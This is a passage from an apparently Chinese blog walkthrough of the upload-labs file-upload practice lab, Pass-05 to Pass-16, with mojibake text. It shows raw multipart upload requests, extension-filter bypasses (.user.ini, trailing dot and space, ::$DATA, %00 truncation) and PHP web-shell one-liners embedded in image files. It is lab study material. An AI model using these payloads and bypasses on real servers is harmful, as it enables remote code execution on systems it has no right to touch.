class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = shell.jpg</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">ä¸Šä¼ </span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>311</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryB0UdjI6DB38pICSw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸Šä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åéœ€è¦ç¨å¾®ç­‰å‡ åˆ†é’Ÿ,ç­‰å¾…user.iniç”Ÿæ•ˆ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220152813484.png" alt="image-20240220152813484"></p><p>è¿™é‡Œå°±æˆåŠŸäº†</p><h2 id="Pass-06-æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡"><a href="#Pass-06-æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-06(æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡)"></a>Pass-06(æœ«å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡)</h2><p>è¿™å…³éœ€è¦åœ¨windowsä¸‹è¿›è¡Œ, å¯¹åº”äº†å¯¹åº” buu upload-labs windowsä¸­çš„Pass-07</p><p>ä¸ä¹‹å‰å¯¹æ¯”è¿™é‡Œå°‘äº†é¦–å°¾å»é™¤ç©ºæ ¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨linuxå¹³å°ä¸‹èƒ½ä¸Šä¼ .php(ç©ºæ ¼)ä½†æ˜¯ä¸èƒ½è§£æ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220144032092.png" alt="image-20240220144032092"></p><p>è€Œåœ¨windowä¸‹ä¸Šä¼ .php(ç©ºæ ¼)å,ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ æ‰æœ«å°¾çš„ç©ºæ ¼</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160008012.png" alt="image-20240220160008012"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160035462.png" alt="image-20240220160035462"></p><h2 id="Pass-07-æœ«å°¾æ·»åŠ -ç»•è¿‡"><a href="#Pass-07-æœ«å°¾æ·»åŠ -ç»•è¿‡" class="headerlink" title="Pass-07(æœ«å°¾æ·»åŠ .ç»•è¿‡)"></a>Pass-07(æœ«å°¾æ·»åŠ .ç»•è¿‡)</h2><p>æ²¡æœ‰åˆ é™¤æœ«å°¾çš„ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154319631.png" alt="image-20240220154319631"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154354916.png" alt="image-20240220154354916"></p><h2 id="Pass-08-æœ«å°¾æ·»åŠ -DATAç»•è¿‡"><a href="#Pass-08-æœ«å°¾æ·»åŠ -DATAç»•è¿‡" class="headerlink" title="Pass-08(æœ«å°¾æ·»åŠ ::$DATAç»•è¿‡)"></a>Pass-08(æœ«å°¾æ·»åŠ ::$DATAç»•è¿‡)</h2><p>ç¼ºå°‘äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ::$DATAä¹‹å‰çš„æ–‡ä»¶åï¼Œä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p><p>ä¾‹å¦‚:â€phpinfo.php::$DATAâ€Windowsä¼šè‡ªåŠ¨å»æ‰æœ«å°¾çš„::$DATAå˜æˆâ€phpinfo.phpâ€</p></blockquote><p>è¿™å…³ä»æ˜¯éœ€è¦åœ¨windowsä¸‹è¿›è¡Œ,<strong>å¯¹åº” buu upload-labs windowsä¸­çš„Pass-09</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155606882.png" alt="image-20240220155606882"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220155548411.png" alt="image-20240220155548411"></p><h2 id="Pass-09-æœ«å°¾æ·»åŠ "><a href="#Pass-09-æœ«å°¾æ·»åŠ " class="headerlink" title="Pass-09(æœ«å°¾æ·»åŠ . .)"></a>Pass-09(æœ«å°¾æ·»åŠ . .)</h2><p>è™½ç„¶åˆ é™¤äº†æœ«å°¾çš„ç‚¹,ä½†æ˜¯åªä¼šåˆ é™¤ä¸€æ¬¡,åªéœ€è¦æ„é€ .php. .å³å¯</p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240220161304719.png" alt="image-20240220161304719"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161250250.png" alt="image-20240220161250250"></p><h2 id="Pass-10-åŒå†™ç»•è¿‡"><a href="#Pass-10-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-10(åŒå†™ç»•è¿‡)"></a>Pass-10(åŒå†™ç»•è¿‡)</h2><p>æ­¤å…³åšäº†ä¸€ä¸ªæ£€æµ‹åˆ°é»‘å­—ç¬¦å¹¶åˆ é™¤ä¸€æ¬¡,åªéœ€è¦æ„é€ ä¸€ä¸ªåŒå†™å³å¯</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161639031.png" alt="image-20240220161639031"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220161708635.png" alt="image-20240220161708635"></p><h2 id="Pass-11-00æˆªæ–­-get"><a href="#Pass-11-00æˆªæ–­-get" class="headerlink" title="Pass-11(%00æˆªæ–­ get)"></a>Pass-11(%00æˆªæ–­ get)</h2><p>æ­¤passåœ¨æœ¬åœ°æµ‹è¯•,æ‰€ä»¥ä¸ºå…¨éƒ¨21å…³çš„pass-12</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§è¿™é‡Œä¸Šä¼ è·¯å¾„å¯æ§, åªéœ€è¦å°†ä¸Šä¼ è·¯å¾„æ„é€ æˆphpæ–‡ä»¶åç„¶å%00æˆªæ–­åé¢çš„æ•°æ®å³å¯</p><blockquote><p>phpç‰ˆæœ¬&lt;&#x3D; 5.3.4</p><p>éœ€è¦è®¾ç½®phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ã€‚</p><p>å¦åˆ™phpä¼šå°†00æˆªæ–­å­—ç¬¦è¿›è¡Œè½¬ä¹‰</p></blockquote><p>æ¯”è¾ƒæ— è¯­çš„éƒ½æ˜¯è¿™äº›æ¡ä»¶éƒ½å¼„å¥½åè¿˜æ˜¯ä¸è¡Œ,ä¸‹ä¸€å…³ä¹Ÿæ˜¯è¿™æ · phpç‰ˆæœ¬5.3.29nts</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220171518503.png" alt="image-20240220171518503"></p><h2 id="Pass-12-00æˆªæ–­-post"><a href="#Pass-12-00æˆªæ–­-post" class="headerlink" title="Pass-12(%00æˆªæ–­ post)"></a>Pass-12(%00æˆªæ–­ post)</h2><p>æ­¤passåœ¨æœ¬åœ°æµ‹è¯•,æ‰€ä»¥ä¸ºå…¨éƒ¨21å…³çš„pass-13</p><p>ä¸ä¸Šä¸€å…³ä¸åŒçš„æ˜¯é‡‡ç”¨postå‘é€è·¯å¾„, %00ä¸ä¼šè¢«è‡ªåŠ¨è§£ç ,æ‰€ä»¥è¦å†hexä¸­æ›´æ”¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172214262.png" alt="image-20240220172214262"></p><p>å°†è¿™é‡Œçš„2bæ”¹ä¸º00å³å¯</p><p>è¿™é‡Œä¹Ÿæ²¡æœ‰æˆåŠŸ,ä½†æ–¹æ³•æ˜¯è¿™ä¸ªæ–¹æ³•</p><h2 id="Pass-13-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass-13-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass-13(å›¾ç‰‡é©¬ç»•è¿‡)"></a>Pass-13(å›¾ç‰‡é©¬ç»•è¿‡)</h2><p>è¿™ä¸€å…³å¯¹æ–‡ä»¶å¤´ä¿¡æ¯åšäº†æ£€æµ‹,å¹¶æ ¹æ®æ–‡ä»¶å¤´å¯¹æ–‡ä»¶åç¼€åé‡å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†çœŸçš„pngå›¾ç‰‡æœ«å°¾åŠ ä¸Šphpæ„é€ å›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220172823309.png" alt="image-20240220172823309"></p><p>ä¹‹ååˆ©ç”¨å…¶ä»–æ¼æ´å¦‚æ–‡ä»¶åŒ…å«æ¥è§£æå›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220173250962.png" alt="image-20240220173250962"></p><h2 id="Pass-14-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass-14-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass-14(å›¾ç‰‡é©¬ç»•è¿‡)"></a>Pass-14(å›¾ç‰‡é©¬ç»•è¿‡)</h2><p>æºç ä¸ä¸€æ ·,ä½†è¿˜æ˜¯ç›¸åŒçš„é…æ–¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174448027.png" alt="image-20240220174448027"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220174459794.png" alt="image-20240220174459794"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>Pass-13,14è§£æ³•ç›¸åŒ</p><h2 id="Pass-16-äºŒæ¬¡æ¸²æŸ“"><a href="#Pass-16-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass-16(äºŒæ¬¡æ¸²æŸ“)"></a>Pass-16(äºŒæ¬¡æ¸²æŸ“)</h2><p>è¿™é‡Œå‚è€ƒä¸€ç¯‡å¤§ä½¬çš„åšå®¢:</p><p><a href="https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">https://www.sqlsec.com/2020/10/upload.html#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93</a></p><p>è¿™é‡Œè™½ç„¶æ˜¯ç¬¬16å…³, ä½†åœ¨å…¨éƒ¨21å…³é‡Œæ˜¯ç¬¬17å…³ä¹Ÿå°±æ˜¯äºŒæ¬¡æ¸²æŸ“</p><h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF:"></a>GIF:</h3><p>éšä¾¿æ‰¾ä¸€å¼ gifå›¾ç‰‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/2.gif" alt="2"></p><p>ä¸Šä¼ å,å°†è¿”å›çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥</p><p>åœ¨010editorçš„toolsä¸­çš„compareæ¨¡å—æ¯”è¾ƒä¸¤å¼ å›¾ç‰‡,å¹¶æ‰¾åˆ°ä¸¤å¼ å›¾ç‰‡ç›¸åŒçš„éƒ¨åˆ†(Matchçš„ç°è‰²éƒ¨åˆ†, æˆ–è€…ç‚¹å‡»matchå,è“è‰²çš„éƒ¨åˆ†)</p><p>ä¹‹åæ’å…¥æœ¨é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194217773.png" alt="image-20240221194217773"></p><p>è¿™é‡Œæ’å…¥åœ¨<code>.......</code>å¤„æˆåŠŸç‡é«˜ä¸€ç‚¹, è¯•è¿‡å‡ æ¬¡æ’åœ¨åˆ«çš„åœ°æ–¹å¯èƒ½ä¼šä¸æˆåŠŸ</p><p>ä¿å­˜åé‡æ–°ä¸Šä¼ ,åŒ…å«æ¸²æŸ“åçš„å›¾ç‰‡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240221194322951.png" alt="image-20240221194322951"></p><h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG:"></a>PNG:</h3><p>ç›´æ¥ä½¿ç”¨githubä¸­çš„å·²æœ‰çš„é¡¹ç›®</p><p><a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/poc">https://github.com/hxer/imagecreatefrom-/tree/master/png/poc</a></p><p>å¯ä»¥ä½¿ç”¨å®ƒç»™å‡ºçš„pocå›¾ç‰‡æˆ–è€…è‡ªå·±ç”Ÿæˆä¸€ä¸ª,è¿™é‡Œç›´æ¥ä½¿ç”¨ç»™å‡ºçš„poc</p><p>æ³¨æ„ è‡ªå·±ç”Ÿæˆçš„è¯éœ€è¦python2ç¯å¢ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc_png.py -p <span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span> -o gg_shell.png old.png</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145218462.png" alt="image-20240222145218462"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222145208117.png" alt="image-20240222145208117"></p><h3 id="JPG"><a href="#JPG" class="headerlink" title="JPG:"></a>JPG:</h3><p>åŒæ„åœ¨githubæ‰¾åˆ°ç°æˆçš„é¡¹ç›®</p><p><a href="https://github.com/BlackFan/jpg_payload">https://github.com/BlackFan/jpg_payload</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222154943666.png" alt="image-20240222154943666"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222155327830.png" alt="image-20240222155327830"></p><p>è¯•äº†å¾ˆå¤šæ¬¡éƒ½æ˜¯è¿™æ ·</p><p>æ¢äº†ä¸€å¼ æ¯”è¾ƒå¤§çš„å›¾ç‰‡,ä¸Šé¢çš„é—®é¢˜æ²¡äº†ä½†æ˜¯æ’å…¥åçš„payloadå¹¶ä¸å®Œæ•´</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160105600.png" alt="image-20240222160105600"></p><p>è¿™é‡Œè¡¥å……: æ’å…¥åçœ‹ä¸è§<code>_</code>å¹¶ä¸æ˜¯<code>_</code>æ¶ˆå¤±äº†, åœ¨010editorèƒ½çœ‹è§<code>_</code>æ˜¯å­˜åœ¨çš„</p><p>æœ€åç”¨å¤§ä½¬çš„è¿™ä¸ªpayloadæ˜¯å¯ä»¥æˆåŠŸæ’å…¥çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222160433105.png" alt="image-20240222160433105"></p><p>ä½†æ˜¯è¿˜ä¼šå‡ºç°æç¤ºä¸æ˜¯jpg</p><p>è¿™é‡Œå…¶å®phpinfoæ’å…¥è¿›å»æ˜¯å¯ä»¥æˆåŠŸçš„, åˆ«çš„payloadè¦ä¹ˆå›æ˜¾ä¸æ˜¯jpg, è¦ä¹ˆæ’å…¥è¿›å»å<code>_</code>è¢«åˆ æ‰äº†</p><p>æœ€åå°è¯•äº†æ— æ•°éåæˆåŠŸæ’å…¥è¿›å»äº†<code>&lt;?php 